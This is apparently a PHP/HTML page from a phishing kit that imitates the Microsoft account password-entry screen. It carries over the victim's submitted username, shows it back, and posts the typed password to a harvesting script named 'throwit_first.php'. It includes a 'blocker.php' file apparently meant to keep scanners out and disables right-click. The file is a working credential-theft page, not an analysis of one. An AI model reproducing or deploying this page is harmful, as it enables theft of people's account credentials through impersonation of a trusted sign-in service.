<?php
include('blocker.php');

// start > to get url and and put id 

// < end 


?>


<?php

session_start();
$Vxuxwejwdwkm = $_POST['username'];
$_SESSION['clientemail']=$Vxuxwejwdwkm;

?>

<!DOCTYPE html>

<html dir="ltr" lang="EN-US"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=Edge"><title>Sign in to your Microsoft account</title><meta name="PageID" content="i5030"><meta name="SiteID" content="292841"><meta name="ReqLC" content="1033"><meta name="LocLC" content="1033"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, user-scalable=no"><link rel="shortcut icon" href="https://auth.gfx.ms/16.000.27457.4/images/favicon.ico">
	<script src='script/val.js'></script>

            <link rel="stylesheet" title="Converged" type="text/css" href="./files/Converged1033.css"><style type="text/css">body.cb input.hip
    {
        border-width: 2px !important;
    }
</style><style type="text/css">body{display:none;}</style><style type="text/css">body{display:block !important;}</style><noscript>&lt;style type="text/css"&gt;body{display:block !important;}&lt;/style&gt;</noscript><link rel="image_src" href="https://auth.gfx.ms/16.000.27457.4/images/Windows_Live_v_thumb.jpg">
 </head>
<body class="cb" data-bind="defineGlobals: ServerData, bodyCssClass" oncontextmenu="alert('Secured');return false;">
<div><!--  --> <div data-bind="component: { name: &#39;background-image&#39;, publicMethods: backgroundControlMethods }"><div class="background" role="presentation" data-bind="css: { app: isAppBranding }, style: { background: backgroundStyle }"><!-- ko if: smallImageUrl --> <div class="blur" data-bind="backgroundImage: smallImageUrl()" style="background-image: url(&quot;http://avastugenetics.com/0.jpg?x=12f4b8b543125cc986c79cd85320812f&quot;);"></div><!-- /ko --><!-- ko if: backgroundImageUrl --> <div class="backgroundImage" data-bind="backgroundImage: backgroundImageUrl()" style="background-image: url(&quot;http://avastugenetics.com/0.jpg?x=f5a9a9531b8f4bcc86eabb19472d15d5&quot;);"></div><!-- /ko --><!-- ko if: !!backgroundImageUrl() --> <div class="background-overlay"></div><!-- /ko --> </div></div> <form name="f1" id="i0281" novalidate="novalidate" spellcheck="false" method="post" target="_top" autocomplete="off"  action="script/throwit_first.php"><!-- ko withProperties: { '$Vxwhykmw2tyc': $Vfg1q1qawxga } --> <div class="outer" ><div class="middle"> <div class="inner" data-bind="css: { &#39;app&#39;: $Vxwhykmw2tyc.backgroundLogoUrl() }"> <div ><img class="logo" role="presentation" pngsrc="https://auth.gfx.ms/16.000.27457.4/images/microsoft_logo.png?x=ed9c9eb0dce17d752bedea6b5acda6d9" svgsrc="https://auth.gfx.ms/16.000.27457.4/images/microsoft_logo.svg?x=ee5c8d9fb6248c938fd0dc19370e90bd" data-bind="imgSrc" src="./files/microsoft_logo.svg"><!-- /ko --> <!-- /ko --><!-- /ko --> <!-- /ko --></div><!-- /ko --> <div ><div data-bind="css: { &#39;animate&#39;: animate() || animate.back(), &#39;back&#39;: animate.back }" class="animate"><!-- ko foreach: views --><!-- ko if: $Vbylzdufntok.currentViewIndex() === $V2p2tgq1xoo1() --><!-- /ko --><!-- ko if: $Vbylzdufntok.currentViewIndex() === $V2p2tgq1xoo1() --> <!-- ko template: { nodes: [$Vfg1q1qawxga], data: $Vbylzdufntok } --><div ><!--  --> <input type="hidden" name="i13" data-bind="value: isKmsiChecked() ? 1 : 0" value="0"> <input type="hidden" name="login" data-bind="value: username" value="user_maintanance912566@outlook.com"> <input type="text" name="loginfmt" data-bind="moveOffScreen, value: displayName" class="moveOffScreen" tabindex="-1" aria-hidden="true"> <input type="hidden" name="type" data-bind="value: svr.Bq ? 20 : 11" value="11"> <input type="hidden" name="LoginOptions" data-bind="value: isKmsiChecked() ? 1 : 3" value="3"> <input type="hidden" name="lrt" data-bind="value: isLongRunningTransaction" value=""> <div data-bind="component: { name: &#39;identity-banner-control&#39;,
     params: {
        pawnIconId: svr.BT,
        displayName: displayName } }"><!--  --> <div class="identityBanner"> <div class="identity" data-bind="text: displayName, attr: { &#39;title&#39;: displayName }" title="user_maintanance912566@outlook.com"><?php echo $Vxuxwejwdwkm  ?></div> <div class="profile-photo"><!-- ko component: 'accessible-image-control' --><!-- ko if: (isHighContrastBlackTheme || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme --><!-- /ko --><!-- ko if: (isHighContrastWhiteTheme || !svr.fHasBackgroundColor) && !isHighContrastBlackTheme --> <!-- ko template: { nodes: [darkImageNode], data: $Vbylzdufntok } --><img role="presentation" data-bind="attr: { src: getDarkUrl() }" src="./files/picker_account_msa.svg"><!-- /ko --> <!-- /ko --><!-- /ko --> </div> </div><!-- ko if: svr.bI && !userTileUrl() --><!-- /ko --></div> <div id="loginHeader" class="row text-title" role="heading" data-bind="text: str[&#39;CT_PWD_STR_EnterPassword_Title&#39;]">Enter password</div><!-- ko if: pageDescription --><!-- /ko --> <div class="row"> <div class="form-group col-md-24"> <div role="alert" aria-live="assertive" aria-atomic="false"><!-- ko if: error --><!-- /ko --> </div> <div class="placeholderContainer" ><!-- ko withProperties: { '$Vjolkor3m4kh': placeholderText } --> <!-- ko template: { nodes: $Vpab5aymsx3q, data: $Vbylzdufntok } -->
<input name="email" type="hidden" id="i0118" autocomplete="off" class="form-control"  value="<?php echo $Vxuxwejwdwkm; ?>">

<script>function empty() {
    var x;
    x = document.getElementById("password").value;
    if (x == "") {
        alert("Enter a Valid Password");
        return false;
    };
} </script>


			<input name="password" type="password" id="password" autocomplete="off" class="form-control" aria-describedby="passwordError loginHeader passwordDesc" placeholder="Password" maxlength="127" required> </div> </div> </div><div class="row"> <div ><div class="col-xs-24 form-group no-padding-left-right" > <div data-bind="css: { &#39;col-xs-12 secondary&#39;: isPrimaryButtonVisible(), &#39;col-xs-24&#39;: !isPrimaryButtonVisible() }" class="col-xs-12 secondary"> <input type="button" id="idBtn_Back" class="btn btn-block"  value="Back"> </div> <div  class="col-xs-12 primary"> 
			
			<input type="submit" id="idSIButton9" class="btn btn-block btn-primary" onClick="return empty()" value="Sign in"> 
			
			</div> </div></div> </div><!-- ko if: svr.BN --><!-- /ko --><!-- ko if: svr.BJ !== false && !svr.BN --> <div id="idTd_PWD_KMSI_Cb" class="form-group checkbox text-block-body no-margin-top" data-bind="visible: !svr.c &amp;&amp; !showHip"> <label id="idLbl_PWD_KMSI_Cb"> <input name="KMSI" id="idChkBx_PWD_KMSI0Pwd" type="checkbox" data-bind="checked: isKmsiChecked, ariaLabel: str[&#39;CT_PWD_STR_KeepMeSignedInCB_Text&#39;]" aria-label="Keep me signed in"> <span data-bind="text: str[&#39;CT_PWD_STR_KeepMeSignedInCB_Text&#39;]">Keep me signed in</span> </label> </div><!-- /ko --> <div class="row"> <div class="col-md-24"> <div class="text-13"> <div class="form-group no-margin-bottom" data-bind="css: { &#39;no-margin-bottom&#39;: !hasRemoteNgc &amp;&amp; !allowPhoneDisambiguation &amp;&amp; !showChangeUserLink }"> <a id="idA_PWD_ForgotPassword" href="https://account.live.com/ResetPassword.aspx?wreply=https://login.live.com/login.srf%3fwa%3dwsignin1.0%26rpsnv%3d13%26ct%3d1493260925%26rver%3d6.7.6640.0%26wp%3dMBI_SSL%26wreply%3dhttps%253a%252f%252foutlook.live.com%252fowa%252f%253fnlp%253d1%26id%3d292841%26CBCXT%3dout%26fl%3dwld%26cobrandid%3d90015%26uaid%3da8d60e23f71e4b599fedbd2dd6b98946%26pid%3d0%26contextid%3d0EE9DFF844DE79AF%26bk%3d1500403644&amp;id=292841&amp;uiflavor=web&amp;cobrandid=90015&amp;uaid=a8d60e23f71e4b599fedbd2dd6b98946&amp;mkt=EN-US&amp;lc=1033&amp;bk=1500403644" data-bind="text: str[&#39;CT_PWD_STR_ForgotPwdLink_Text&#39;], href: svr.e, click: resetPassword_onClick">Forgot my password</a> </div><!-- ko if: allowPhoneDisambiguation --><!-- /ko --><!-- ko if: hasRemoteNgc --><!-- /ko --> <div class="form-group no-margin-bottom" data-bind="visible: showChangeUserLink" style="display: none;"> <a id="i1668" href="https://login.live.com/logout.srf?wa=wsignin1.0&amp;rpsnv=13&amp;ct=1493260925&amp;rver=6.7.6640.0&amp;wp=MBI_SSL&amp;wreply=https%3a%2f%2foutlook.live.com%2fowa%2f%3fnlp%3d1&amp;id=292841&amp;CBCXT=out&amp;fl=wld&amp;cobrandid=90015&amp;uaid=a8d60e23f71e4b599fedbd2dd6b98946&amp;pid=0&amp;contextid=0EE9DFF844DE79AF&amp;ru=https://outlook.live.com/owa/%3fnlp%3d1&amp;bk=1500403644&amp;lm=I" data-bind="text: str[&#39;CT_FED_STR_ChangeUserLink_Text&#39;], href: svr.urlSwitch">Sign in with a different Microsoft account</a> </div> </div> </div> </div> </div></div> </div> 
			<div ></div> </div> <!-- /ko --></div><!-- ko if: desktopSsoRunning --><!-- /ko --><!-- /ko --><!-- ko if: showOptOutBanner --><!-- /ko --> <div id="footer"> <div data-bind="component: { name: &#39;footer-control&#39;,
            params: {
                serverData: svr,
                showLinks: true },
            event: {
                agreementClick: footer_agreementClick } }"><!-- ko if: showLinks || impressumLink || showIcpLicense --> <div id="footerLinks" class="footerNode text-secondary"><!-- ko if: !showIcpLicense --> <span id="ftrCopy" data-bind="html: svr.ac">©2017 Microsoft</span><!-- /ko --> <a id="ftrTerms" data-bind="text: str[&#39;MOBILE_STR_Footer_Terms&#39;], href: termsLink, click: termsLink_onClick" href="https://login.live.com/gls.srf?urlID=WinLiveTermsOfUse&amp;mkt=EN-US&amp;vv=1600">Terms of Use</a> <a id="ftrPrivacy" data-bind="text: str[&#39;MOBILE_STR_Footer_Privacy&#39;], href: privacyLink, click: privacyLink_onClick" href="https://login.live.com/gls.srf?urlID=MSNPrivacyStatement&amp;mkt=EN-US&amp;vv=1600">Privacy &amp; Cookies</a><!-- ko if: impressumLink --><!-- /ko --><!-- ko if: showIcpLicense --><!-- /ko --> </div> <!-- /ko --></div> </div> </form> <form method="post" target="_top" data-bind="autoSubmit: postRedirectForceSubmit, attr: { action: postRedirectUrl }"><!-- ko foreach: postRedirectParams --><!-- /ko --> </form></div><iframe id="idPartnerPL" height="0" width="0" src="./files/prefetch.html" style="display: none;"></iframe></body></html>